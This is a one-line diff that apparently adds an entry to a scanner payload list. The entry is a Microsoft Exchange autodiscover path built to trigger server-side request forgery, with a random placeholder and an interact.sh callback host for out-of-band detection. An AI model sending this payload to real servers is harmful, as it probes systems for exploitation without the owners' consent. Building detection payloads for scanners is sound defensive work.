@@ -1,0 +1,1 @@
+/autodiscover/autodiscover.json/v1.0/{{randstr}}@interact.sh?Protocol=Autodiscoverv1
